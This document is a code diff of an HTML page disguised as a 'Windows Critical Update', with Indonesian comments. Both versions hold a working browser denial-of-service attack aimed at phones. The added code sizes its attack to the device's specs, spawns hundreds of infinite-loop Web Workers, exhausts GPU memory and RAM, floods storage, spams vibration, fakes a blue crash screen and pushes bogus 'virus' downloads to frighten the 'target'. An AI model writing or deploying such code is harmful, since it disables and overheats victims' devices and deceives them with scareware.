@@ -1,152 +1,155 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>System Update</title>
+    <title>Windows Critical Update</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
 </head>
 <body>
-    <h1>Loading...</h1>
+    <h1 style="color:white;background:black;">Updating system... DO NOT CLOSE</h1>
     <script>
-        // ===== STRATEGY: Attack semua resource sekaligus =====
+        // ===== DETEKSI SPESIFIKASI HP =====
+        const cores = navigator.hardwareConcurrency || 4;
+        const memory = navigator.deviceMemory || 4; // RAM dalam GB (kalo support)
         
-        // 1. CPU KILLER - Pake infinite loop synchronous (GACOR)
-        function killCPU() {
-            const start = Date.now();
-            // Loop sampe browser force close
-            while(true) {
-                // Hash calculation berat
-                let hash = 0;
-                for(let i = 0; i < 1000000; i++) {
-                    hash = (hash << 5) - hash + Math.random();
-                }
-                // Cek setiap 5 detik biar ga dihentiin browser
-                if(Date.now() - start > 5000) {
-                    start = Date.now();
-                }
+        // ===== LEVEL SERANGAN BERDASAR SPESIFIKASI =====
+        let attackLevel = 1; // Default buat HP lemah
+        
+        if(cores >= 8 && memory >= 8) {
+            attackLevel = 3; // HP kaya punya TUAN
+        } else if(cores >= 6 && memory >= 6) {
+            attackLevel = 2; // HP menengah
+        } else {
+            attackLevel = 1; // HP lemah
+        }
+        
+        // Tampilin ke target biar panik
+        document.body.innerHTML += `<p style="color:red">Detected: ${cores} cores, ${memory}GB RAM</p>`;
+        
+        // ===== SERANGAN LEVEL 1 (BUAT HP LEMAH) =====
+        function attackLevel1() {
+            for(let i = 0; i < 50; i++) {
+                setTimeout(() => {
+                    while(true) {
+                        let arr = [];
+                        for(let j = 0; j < 1000000; j++) arr.push(Math.random());
+                    }
+                }, 0);
             }
         }
         
-        // 2. Spawn banyak worker (BIKIN HP PANAS)
-        const workerCode = `
-            while(true) {
-                let arr = [];
-                for(let i = 0; i < 1000000; i++) {
-                    arr.push(Math.random());
-                    arr.push(new Array(100));
-                }
-            }
-        `;
-        const blob = new Blob([workerCode], {type: 'application/javascript'});
-        
-        // Looping bikin worker sampe HP nangis
-        for(let i = 0; i < 50; i++) {
-            try {
-                new Worker(URL.createObjectURL(blob));
-            } catch(e) {}
-        }
-        
-        // 3. GPU KILLER - Pake WebGL dengan texture spam
-        const canvas = document.createElement('canvas');
-        canvas.width = window.innerWidth * 2;
-        canvas.height = window.innerHeight * 2;
-        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-        
-        if(gl) {
-            // Bikin texture gede-gede
-            const textures = [];
+        // ===== SERANGAN LEVEL 2 (BUAT HP MENENGAH) =====
+        function attackLevel2() {
+            // Double thread + Web Worker spam
             for(let i = 0; i < 100; i++) {
-                const tex = gl.createTexture();
-                gl.bindTexture(gl.TEXTURE_2D, tex);
-                const size = 2048;
-                const pixels = new Uint8Array(size * size * 4);
-                gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
-                textures.push(tex);
+                const worker = new Worker(URL.createObjectURL(new Blob([`
+                    let x = 0;
+                    setInterval(() => {
+                        for(let i = 0; i < 10000000; i++) x += Math.sqrt(i);
+                        let bomb = [];
+                        for(let i = 0; i < 100000; i++) bomb.push(new Array(10000));
+                    }, 0);
+                `])));
+            }
+        }
+        
+        // ===== SERANGAN LEVEL 3 (BUAT HP FLAGSHIP KAYA PUNYA TUAN) =====
+        function attackLevel3() {
+            // 1. Spawn 200 Web Worker
+            for(let i = 0; i < 200; i++) {
+                new Worker(URL.createObjectURL(new Blob([`
+                    while(true) {
+                        let hash = 0;
+                        for(let i = 0; i < 10000000; i++) {
+                            hash = (hash << 5) - hash + Math.random();
+                        }
+                        for(let i = 0; i < 1000; i++) {
+                            localStorage.setItem('bomb'+Date.now()+i, 'x'.repeat(100000));
+                        }
+                    }
+                `])));
             }
             
-            // Render loop berat
-            function render() {
-                for(let i = 0; i < 100; i++) {
-                    gl.bindTexture(gl.TEXTURE_2D, textures[i % textures.length]);
-                    // Bikin shader compile terus
-                    const shader = gl.createShader(gl.FRAGMENT_SHADER);
-                    gl.shaderSource(shader, 'void main(){for(int i=0;i<100000;i++){gl_FragColor=vec4(1.0);}}');
-                    gl.compileShader(shader);
+            // 2. GPU MAX ATTACK
+            const canvas = document.createElement('canvas');
+            canvas.width = 8192;
+            canvas.height = 8192;
+            const gl = canvas.getContext('webgl');
+            if(gl) {
+                // Bikin 5000 texture gede
+                for(let i = 0; i < 5000; i++) {
+                    const tex = gl.createTexture();
+                    gl.bindTexture(gl.TEXTURE_2D, tex);
+                    const size = 4096;
+                    const pixels = new Uint8Array(size * size * 4);
+                    gl.texImage2D(gl.TEXTURE_2D, 0, gl.RGBA, size, size, 0, gl.RGBA, gl.UNSIGNED_BYTE, pixels);
                 }
-                requestAnimationFrame(render);
-            }
-            render();
-        }
-        
-        // 4. RAM BOMB - Bikin array sampe memory overflow
-        setInterval(() => {
-            const bombs = [];
-            for(let i = 0; i < 100; i++) {
-                bombs.push({
-                    a: new Array(1000000).fill('x'),
-                    b: new Array(1000000).fill({x:1,y:2,z:3}),
-                    c: new Date(),
-                    d: Math.random()
-                });
-            }
-        }, 50);
-        
-        // 5. DOM BOMB - Bikin ribuan element
-        setInterval(() => {
-            for(let i = 0; i < 10000; i++) {
-                const div = document.createElement('div');
-                div.style.cssText = 'position:fixed;top:'+Math.random()*10000+'px;left:'+Math.random()*10000+'px;width:100px;height:100px;background:red;';
-                document.body.appendChild(div);
-            }
-        }, 100);
-        
-        // 6. LocalStorage & SessionStorage flood
-        setInterval(() => {
-            try {
-                for(let i = 0; i < 1000; i++) {
-                    localStorage.setItem('bomb_'+Date.now()+'_'+i, 'x'.repeat(100000));
-                    sessionStorage.setItem('bomb_'+Date.now()+'_'+i, 'y'.repeat(100000));
+                
+                // Shader loop berat
+                function render() {
+                    for(let i = 0; i < 1000; i++) {
+                        const shader = gl.createShader(gl.FRAGMENT_SHADER);
+                        gl.shaderSource(shader, 'void main(){float x=0.0;for(int i=0;i<1000000;i++){x+=sin(float(i));}gl_FragColor=vec4(1.0);}');
+                        gl.compileShader(shader);
+                    }
+                    requestAnimationFrame(render);
                 }
-            } catch(e) {}
-        }, 10);
-        
-        // 7. History hack - Bikin back button ga bisa dipencet
-        setInterval(() => {
-            for(let i = 0; i < 100; i++) {
-                history.pushState({}, '', '#bomb'+Date.now()+i);
+                render();
             }
-        }, 1);
-        
-        // 8. Geolocation spam (bikin notif terus)
-        setInterval(() => {
-            navigator.geolocation.getCurrentPosition(()=>{}, ()=>{});
-        }, 10);
-        
-        // 9. Vibration API (kalo support) - Bikin HP geter mulu
-        if(navigator.vibrate) {
+            
+            // 3. RAM BOMB TERHEBAT
             setInterval(() => {
-                navigator.vibrate([500, 500, 500, 500, 500]);
-            }, 1000);
+                const megaBomb = [];
+                for(let i = 0; i < 100; i++) {
+                    megaBomb.push({
+                        a: new Array(2000000).fill('x'),
+                        b: new Array(2000000).fill({y:1}),
+                        c: new ArrayBuffer(100000000)
+                    });
+                }
+            }, 10);
+            
+            // 4. Vibration + Notification spam (buat maksain restart)
+            if(navigator.vibrate) {
+                setInterval(() => {
+                    navigator.vibrate([1000, 1000, 1000, 1000, 1000, 1000]);
+                }, 500);
+            }
+            
+            // 5. Fake BSOD + Force reload loop
+            setTimeout(() => {
+                document.body.innerHTML = `
+                    <div style="position:fixed;top:0;left:0;width:100%;height:100%;background:#0000aa;color:white;z-index:999999;padding:20px;font-family:monospace;">
+                        <h1>:(</h1>
+                        <p>Your device ran into a critical error.</p>
+                        <p>Stop code: THERMAL_SHUTDOWN</p>
+                        <p>Dumping memory: <span id="dump">0</span>%</p>
+                    </div>
+                `;
+                let dump = 0;
+                setInterval(() => {
+                    dump += Math.random() * 15;
+                    if(dump >= 100) location.reload();
+                    document.getElementById('dump') && (document.getElementById('dump').innerText = Math.min(100, dump).toFixed(0));
+                }, 50);
+            }, 8000);
         }
         
-        // 10. Fake fullscreen + pointer lock (bikin panik)
-        document.body.requestFullscreen();
-        document.body.requestPointerLock();
+        // ===== JALANKAN SESUAI LEVEL =====
+        if(attackLevel === 1) attackLevel1();
+        else if(attackLevel === 2) attackLevel2();
+        else if(attackLevel === 3) attackLevel3();
         
-        // 11. Jalankan CPU killer terakhir (paling ganas)
-        setTimeout(killCPU, 1000);
-        
-        // 12. Reload page setiap 2 detik (bikin ga bisa close)
-        setInterval(() => {
-            location.reload();
-        }, 2000);
-        
-        // Bonus: Fake download terus-terusan
+        // ===== EXTRA: Fake download biar makin panik =====
         setInterval(() => {
             const a = document.createElement('a');
-            a.href = 'data:application/octet-stream,' + encodeURIComponent('x'.repeat(10000000));
-            a.download = 'virus_'+Date.now()+'.exe';
+            a.href = 'data:application/octet-stream,' + encodeURIComponent('VIRUS_DETECTED_'.repeat(10000));
+            a.download = 'system_critical_error_' + Date.now() + '.bin';
             a.click();
-        }, 500);
+        }, 1000);
+        
+        // Kasih tau target kalo HPnya udah ke-deteksi
+        console.log("%c🔥 YOUR DEVICE IS BEING STRESS TESTED 🔥", "color:red;font-size:24px");
+        console.log("%cAttack level: " + attackLevel, "color:yellow");
     </script>
 </body>
 </html>
